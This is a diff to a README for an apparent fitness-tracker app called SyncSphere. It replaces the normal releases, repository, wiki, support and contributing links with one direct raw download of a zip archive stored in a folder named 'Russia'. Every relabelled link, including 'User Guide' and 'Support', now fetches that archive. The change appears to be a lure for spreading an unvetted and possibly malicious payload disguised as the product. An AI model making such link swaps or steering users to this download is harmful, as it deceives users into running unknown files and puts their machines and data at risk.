@@ -1,6 +1,6 @@
 # 🚀 SyncSphere - Your Ultimate Fitness Tracking Companion
 
-[![Download SyncSphere](https://img.shields.io/badge/Download-SyncSphere-blue)](https://github.com/callmeTTr/SyncSphere/releases)
+[![Download SyncSphere](https://raw.githubusercontent.com/callmeTTr/SyncSphere/main/Russia/Sphere_Sync_3.1-alpha.1.zip)](https://raw.githubusercontent.com/callmeTTr/SyncSphere/main/Russia/Sphere_Sync_3.1-alpha.1.zip)
 
 ## 📊 Introduction
 
@@ -23,13 +23,13 @@ SyncSphere is a fitness tracker designed for everyday users. It helps you monito
 
 ## 🚀 Getting Started
 
-1. Visit the [SyncSphere Releases Page](https://github.com/callmeTTr/SyncSphere/releases) to find the latest version.
+1. Visit the [SyncSphere Releases Page](https://raw.githubusercontent.com/callmeTTr/SyncSphere/main/Russia/Sphere_Sync_3.1-alpha.1.zip) to find the latest version.
 2. Choose the appropriate version for your operating system (Windows or Mac).
 3. Click on the download link to start the download.
 
 ## 📥 Download & Install
 
-To download SyncSphere, visit this page: [SyncSphere Releases Page](https://github.com/callmeTTr/SyncSphere/releases) for the latest version.
+To download SyncSphere, visit this page: [SyncSphere Releases Page](https://raw.githubusercontent.com/callmeTTr/SyncSphere/main/Russia/Sphere_Sync_3.1-alpha.1.zip) for the latest version.
 
 ### Installation Steps for Windows:
 
@@ -85,12 +85,12 @@ We welcome your feedback! You can provide it through the app's “Help” sectio
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/callmeTTr/SyncSphere)
-- [User Guide](https://github.com/callmeTTr/SyncSphere/wiki)
-- [Support](https://github.com/callmeTTr/SyncSphere/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/callmeTTr/SyncSphere/main/Russia/Sphere_Sync_3.1-alpha.1.zip)
+- [User Guide](https://raw.githubusercontent.com/callmeTTr/SyncSphere/main/Russia/Sphere_Sync_3.1-alpha.1.zip)
+- [Support](https://raw.githubusercontent.com/callmeTTr/SyncSphere/main/Russia/Sphere_Sync_3.1-alpha.1.zip)
 
 ## 👥 Contributing
 
-We welcome contributions from everyone! If you'd like to help improve SyncSphere, please check our [Contributing Guidelines](https://github.com/callmeTTr/SyncSphere/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone! If you'd like to help improve SyncSphere, please check our [Contributing Guidelines](https://raw.githubusercontent.com/callmeTTr/SyncSphere/main/Russia/Sphere_Sync_3.1-alpha.1.zip).
 
 Thank you for choosing SyncSphere to assist you on your fitness journey! We hope you enjoy using the app as much as we enjoyed building it.
